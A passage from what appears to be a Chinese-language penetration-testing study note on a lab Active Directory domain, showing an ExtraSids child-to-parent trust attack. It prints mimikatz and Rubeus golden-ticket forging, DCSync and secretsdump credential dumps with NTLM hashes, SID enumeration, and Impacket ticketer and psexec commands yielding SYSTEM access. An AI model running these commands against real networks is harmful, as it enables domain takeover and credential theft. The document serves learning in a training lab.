class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM ; <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM ; <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;hacker @ LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> successfully submitted <span class="keyword">for</span> current session</span><br></pre></td></tr></table></figure>

<p>使用 klist 可以确认不存在的黑客用户的 Kerberos 票证驻留在内存中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>xf6462</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        Renew Time: <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br></pre></td></tr></table></figure>

<p>列出域控制器的整个 C: 驱动器</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span> has no label.</span><br><span class="line"> Volume Serial Number is B8B3<span class="literal">-0D72</span></span><br><span class="line"></span><br><span class="line"> Directory of \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="number">09</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">12</span>:<span class="number">19</span> AM    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">10</span>/<span class="number">06</span>/<span class="number">2021</span>  <span class="number">01</span>:<span class="number">50</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">09</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">02</span>:<span class="number">06</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">11</span>/<span class="number">19</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">17</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Shares</span><br><span class="line"><span class="number">10</span>/<span class="number">06</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">31</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">03</span>/<span class="number">21</span>/<span class="number">2022</span>  <span class="number">12</span>:<span class="number">18</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> File(s)              <span class="number">0</span> bytes</span><br><span class="line">               <span class="number">6</span> <span class="built_in">Dir</span>(s)  <span class="number">18</span>,<span class="number">080</span>,<span class="number">178</span>,<span class="number">176</span> bytes free</span><br></pre></td></tr></table></figure>

<h4 id="Rubeus-3"><a href="#Rubeus-3" class="headerlink" title="Rubeus"></a>Rubeus</h4><p><code>/rc4</code> KRBTGT 帐户的 NT Hash</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:<span class="number">9</span>d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S<span class="literal">-1-5-21-2806153819-209893948-922872689</span>  /sids:S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span> /user:hacker /ptt</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span> </span><br><span class="line"></span><br><span class="line">[*] Action: Build TGT</span><br><span class="line"></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">[*] UserId         : <span class="number">500</span></span><br><span class="line">[*] Groups         : <span class="number">520</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">519</span>,<span class="number">518</span></span><br><span class="line">[*] ExtraSIDs      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br><span class="line">[*] ServiceKey     : <span class="number">9</span>D765B482771505CBE97411065964D5F</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] KDCKey         : <span class="number">9</span>D765B482771505CBE97411065964D5F</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;hacker@LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line">[*] StartTime      : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line">[*] EndTime        : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">06</span>:<span class="number">41</span> PM</span><br><span class="line">[*] RenewTill      : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG</span><br><span class="line">      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M</span><br><span class="line">      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH</span><br><span class="line">      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++<span class="number">2</span>iX94uRrwa/S</span><br><span class="line">      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy</span><br><span class="line">      k7+<span class="number">0</span>EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc</span><br><span class="line">      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm</span><br><span class="line">      <span class="number">9</span>f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY</span><br><span class="line">      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz</span><br><span class="line">      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/<span class="number">4</span>GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT</span><br><span class="line">      <span class="number">3</span>dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+<span class="built_in">H</span></span><br><span class="line">      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG</span><br><span class="line">      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo</span><br><span class="line">      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/<span class="number">3</span>l5j0KxgjdZbwoFbC7p76IPC3B</span><br><span class="line">      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/<span class="number">2</span>eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/</span><br><span class="line">      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3</span><br><span class="line">      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH</span><br><span class="line">      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+<span class="number">2</span>+xps6WS/NNf1vZtUV/KRLlW</span><br><span class="line">      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ</span><br><span class="line">      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij</span><br><span class="line">      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T</span><br><span class="line">      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo</span><br><span class="line">      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy</span><br><span class="line">      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP</span><br><span class="line">      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<p>可以使用<code>klist</code>检查票证是否在内存中。</p>
<h3 id="DCSync-2"><a href="#DCSync-2" class="headerlink" title="DCSync"></a>DCSync</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\lab_adm&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : lab_adm</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : lab_adm</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">53</span>:<span class="number">21</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1001</span></span><br><span class="line">Object Relative ID   : <span class="number">1001</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    ntlm- <span class="number">1</span>: <span class="number">663715</span>a1a8b957e8e9943cc98ea451b6</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">6053227</span>db44e996fe16b107d9d1e95a0</span><br></pre></td></tr></table></figure>

<p>当处理多个域并且目标域与用户的域不同时，需要指定确切的域以在特定域控制器上执行 DCSync 操作。此命令如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</span></span><br></pre></td></tr></table></figure>

<h2 id="ExtraSids-Attack-Linux"><a href="#ExtraSids-Attack-Linux" class="headerlink" title="ExtraSids Attack - Linux"></a>ExtraSids Attack - Linux</h2><h3 id="Collect-1"><a href="#Collect-1" class="headerlink" title="Collect"></a>Collect</h3><h4 id="Impacket-secretsdump-py-1"><a href="#Impacket-secretsdump-py-1" class="headerlink" title="Impacket secretsdump.py"></a>Impacket secretsdump.py</h4><p>Impacket secretsdump.py 执行 DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e</span><br><span class="line">krbtgt:des-cbc-md5:fee04c3d026d7538</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h4 id="Impacket-lookupsid-py"><a href="#Impacket-lookupsid-py" class="headerlink" title="Impacket lookupsid.py"></a>Impacket lookupsid.py</h4><p>Impacket lookupsid.py  执行 SID 暴力破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Brute forcing SIDs at 172.16.5.240</span><br><span class="line">[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689</span><br><span class="line">500: LOGISTICS\Administrator (SidTypeUser)</span><br><span class="line">501: LOGISTICS\Guest (SidTypeUser)</span><br><span class="line">502: LOGISTICS\krbtgt (SidTypeUser)</span><br><span class="line">512: LOGISTICS\Domain Admins (SidTypeGroup)</span><br><span class="line">513: LOGISTICS\Domain Users (SidTypeGroup)</span><br><span class="line">514: LOGISTICS\Domain Guests (SidTypeGroup)</span><br><span class="line">515: LOGISTICS\Domain Computers (SidTypeGroup)</span><br><span class="line">516: LOGISTICS\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: LOGISTICS\Cert Publishers (SidTypeAlias)</span><br><span class="line">520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: LOGISTICS\Protected Users (SidTypeGroup)</span><br><span class="line">526: LOGISTICS\Key Admins (SidTypeGroup)</span><br><span class="line">553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1001: LOGISTICS\lab_adm (SidTypeUser)</span><br><span class="line">1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)</span><br><span class="line">1103: LOGISTICS\DnsAdmins (SidTypeAlias)</span><br><span class="line">1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)</span><br><span class="line">1106: LOGISTICS\-student_adm (SidTypeUser)</span><br></pre></td></tr></table></figure>

<p>Impacket lookupsid.py 获取域 SID 和企业管理员的 RID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114</span><br><span class="line">498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: INLANEFREIGHT\administrator (SidTypeUser)</span><br><span class="line">501: INLANEFREIGHT\guest (SidTypeUser)</span><br><span class="line">502: INLANEFREIGHT\krbtgt (SidTypeUser)</span><br><span class="line">512: INLANEFREIGHT\Domain Admins (SidTypeGroup)</span><br><span class="line">513: INLANEFREIGHT\Domain Users (SidTypeGroup)</span><br><span class="line">514: INLANEFREIGHT\Domain Guests (SidTypeGroup)</span><br><span class="line">515: INLANEFREIGHT\Domain Computers (SidTypeGroup)</span><br><span class="line">516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: INLANEFREIGHT\Schema Admins (SidTypeGroup)</span><br><span class="line">519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)</span><br></pre></td></tr></table></figure>

<h3 id="Golden-Ticket-1"><a href="#Golden-Ticket-1" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>至此，收集到了以下数据点：</p>
<ul>
<li>子域的 KRBTGT 哈希：<code>9d765b482771505cbe97411065964d5f</code></li>
<li>子域的 SID：<code>S-1-5-21-2806153819-209893948-922872689</code></li>
<li>子域中的目标用户的名称（不需要存在！）：<code>hacker</code></li>
<li>子域的 FQDN：<code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li>
<li>根域的企业管理员组的 SID:<code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li>
</ul>
<h4 id="Impacket-ticketer-py"><a href="#Impacket-ticketer-py" class="headerlink" title="Impacket ticketer.py"></a>Impacket ticketer.py</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker</span><br><span class="line">[*] 	PAC_LOGON_INFO</span><br><span class="line">[*] 	PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*] 	EncTicketPart</span><br><span class="line">[*] 	EncAsRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*] 	PAC_SERVER_CHECKSUM</span><br><span class="line">[*] 	PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*] 	EncTicketPart</span><br><span class="line">[*] 	EncASRepPart</span><br><span class="line">[*] Saving ticket in hacker.ccache</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">该票证将作为凭证缓存 (ccache)</a>文件保存到系统中，该文件用于保存 Kerberos 凭证。设置<code>KRB5CCNAME</code>环境变量，使用此文件进行 Kerberos 身份验证尝试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export KRB5CCNAME=hacker.ccache </span><br></pre></td></tr></table></figure>

<h4 id="Impacket-psexec-py"><a href="#Impacket-psexec-py" class="headerlink" title="Impacket psexec.py"></a>Impacket psexec.py</h4><p>Impacket psexec.py 获取 SYSTEM shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 172.16.5.5.....</span><br><span 